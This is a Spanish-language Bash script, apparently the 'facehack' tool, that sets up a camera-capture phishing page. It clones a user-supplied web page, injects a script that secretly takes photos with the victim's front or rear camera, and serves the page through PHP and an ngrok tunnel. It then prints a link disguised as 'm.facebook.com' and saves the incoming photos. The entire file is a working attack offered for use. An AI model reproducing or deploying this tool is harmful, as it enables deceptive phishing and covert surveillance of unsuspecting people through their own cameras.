#!/usr/bin/bash

#colores

declare -gA colours=(
	["gray"]="\033[1;30m" ["red"]="\033[1;31m"
	["green"]="\033[1;32m" ["yellow"]="\033[1;33m"
	["blue"]="\033[1;34m" ["cyan"]="\033[1;35m"
	["white"]="\033[0m"
)
trap ctrl_c INT > /dev/null 2>&1

function ctrl_c {
	pkill php 2> /dev/null; pkill ngrok 2> /dev/null
		echo -Ee "\n${colours["green"]}
  TODAS LAS FOTOS CAPTURADAS SE GUARDARAN EN TU CARPETA 
  	   DE DESCARGAS DE TU MEMORIA INTERNA!"
	   cp foto*.png ~/storage/shared/Download 2> /dev/null
	   mv foto*.png ../fotos-guardadas 2> /dev/null
	for ((x=1; x<=2; x=x+1)); do
		if [[ ${x} -eq 1 ]]; then echo ''; fi
		echo -ne "${colours["yellow"]}[${colours["red"]}-${colours["yellow"]}] ${colours["red"]}Saliendo.${colours["white"]}\r"; sleep 0.5
		echo -ne "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}Saliendo..${colours["white"]}\r"; sleep 0.5
		echo -ne "${colours["yellow"]}[${colours["red"]}-${colours["yellow"]}] ${colours["red"]}Saliendo...${colours["white"]}\r"; sleep 0.5
		if [[ ${x} -eq 2 ]]; then echo ''; fi
	done
	tput cnorm 2> /dev/null
	exit 0
}

function dependencias(){
	pkill php 2> /dev/null; pkill ngrok 2> /dev/null
command -v ruby > /dev/null 2>&1 || {
	echo >&2 -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}No tienes instalado ruby, instalalo!.\n"
	echo >&2 -Ee "\t${colours["green"]}apt install ruby -y${colours["white"]}\n"; exit 1
}

command -v tput > /dev/null 2>&1 || {
        echo >&2 -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}No tienes instalado ncurses, instalalo!.\n"
        echo >&2 -Ee "\t${colours["green"]}apt install ncurses-utils -y${colours["white"]}\n"; exit 1
}

command -v php > /dev/null 2>&1 || {
	echo >&2 -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}No tienes instalado php, instalalo!.\n"
	echo >&2 -Ee "\t${colours["green"]}apt install php -y${colours["white"]}\n"; exit 1
}

command -v wget > /dev/null 2>&1 || {
	echo >&2 -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}No tienes instalado wget, instalalo!.\n"
	echo >&2 -Ee "\t${colours["green"]}apt install wget -y${colours["white"]}\n"; exit 1
}

command -v curl > /dev/null 2>&1 || {
        echo >&2 -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}No tienes instalado curl, instalalo!.\n"
        echo >&2 -Ee "\t${colours["green"]}apt install curl -y${colours["white"]}\n"; exit 1
}

command -v lolcat > /dev/null 2>&1 || {
	echo >&2 -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}No tienes instalado lolcat, instalalo!.\n"
        echo >&2 -Ee "\t${colours["green"]}gem install lolcat${colours["white"]}\n"; exit 1
}

}

function banner(){
tput civis 2> /dev/null
clear; cd archivos; echo -e "${blue}
     ____  ____    _____   ___     __   ____  ___ ___ 
    l    j|    \  / ___/  /  _]   /  ] /    T|   T   T
     |  T |  _  Y(   \_  /  [_   /  / Y  o  || _   _ |
     |  | |  |  | \__  TY    _] /  /  |     ||  \_/  |
     |  | |  |  | /  \ ||   [_ /   \_ |  _  ||   |   |
     j  l |  |  | \    ||     T\     ||  |  ||   |   |
    |____jl__j__j  \___jl_____j \____jl__j__jl___j___j" | lolcat
  echo -Ee "      github: https://github.com/wilian-lgn/facehack" | lolcat -a
  echo -Ee "\t    facebook: https://fb.me/wilian.lgn" | lolcat -a
echo -Ee "\n\t\t${colours["yellow"]}ELEGIR CAMARA
${colours["yellow"]}[${colours["green"]}01${colours["yellow"]}] ${colours["yellow"]}Frontal
${colours["yellow"]}[${colours["green"]}02${colours["yellow"]}] ${colours["yellow"]}Delantera\n"
read -p $'\033[1;32mOPCION:  \033[0m' camara

if [ -z ${camara} ]; then
	echo -Ee "${colours["red"]}\n[+] NO ESCRIBISTE NADA!${colours["white"]}\n"
	exit 1
elif [[ ${camara} == 01 || ${camara} == 1 ]]; then
	sed 's/type_camera/user/' ajax2.js > ajax.js
elif [[ ${camara} == 02 || ${camara} == 2 ]]; then
	sed 's/type_camera/environment/' ajax2.js > ajax.js
else
	echo -Ee "${colours["red"]}\n[+] OPCION INCORRECTA!${colours["white"]}\n"
	exit 1
fi

echo -Ee "${colours["yellow"]}
  INGRESE LA URL DE LA PAGINA QUE SE MOSTRARA
\t\tEN EL PHISHING${colours["white"]}
"

read -p $'\033[1;32mURL: \033[0m' url

if [ -z ${url} ]; then
	echo -Ee "${colours["red"]}\n[+] OPCION INCORRECTA!${colours["white"]}\n"
	exit 1
fi

curl -s ${url} > index.html
cat pagina.html >> index.html
}

 function ngrok(){
	 php -S localhost:4433 2> /dev/null &
	 echo ''
	 for ((x=1;x<=6; x=x+1)); do
		 echo -ne "\r${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Abriendo servidor local."; sleep 0.2
		 echo -ne "\r${colours["yellow"]}[${colours["red"]}|${colours["yellow"]}] ${colours["yellow"]}Abriendo servidor local.."; sleep 0.2
		 echo -ne "\r${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Abriendo servidor local..."; sleep 0.2
		 if [[ ${x} -eq 6 ]]; then echo ''; fi
	 done

	 ./ngrok http 4433 > /dev/null 2> /dev/null &

	 for ((x=1;x<=17; x=x+1)); do
		 echo -ne "\r${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Abriendo servidor ngrok."; sleep 0.2
                 echo -ne "\r${colours["yellow"]}[${colours["red"]}|${colours["yellow"]}] ${colours["yellow"]}Abriendo servidor ngrok.."; sleep 0.2
                 echo -ne "\r${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Abriendo servidor ngrok..."; sleep 0.2
		 if [[ ${x} -eq 17 ]]; then echo ""; fi
	 done
echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Obteniendo links..."; sleep 1
echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Servidor local:${colours["white"]} localhost:4433"

echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Servidor ngrok:${colours["white"]} $(curl -s http://127.0.0.1:404[0-9]/api/tunnels | grep -o "https://[a-z0-9A-Z]*\.ngrok.io" | head -n1)"

echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Servidor local.run:${colours["red"]} Deshabilitado!"

echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Servidor serveo.net:${colours["red"]} Deshabilitado!"

echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Link camuflado:${colours["white"]} https://m.facebook.com@$(curl -s http://127.0.0.1:404[0-9]/api/tunnels | grep -o "https://[a-z0-9A-Z]*\.ngrok.io" | head -n1 | cut -c 9-100)"

echo -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["gray"]}Esperando datos...\t\t\t${colours["green"]}    parar: ctrl+c\n"

declare -gi counter=1
while [ true ]; do
	if [ -f foto.txt ]; then
		echo -ne "\r\t${colours["yellow"]}[${colours["green"]}${counter}${colours["yellow"]}] Fotos recibidas!${colours["white"]}"
		let counter+=1
		rm -rf foto.txt
	fi
done
}

dependencias
banner
ngrok
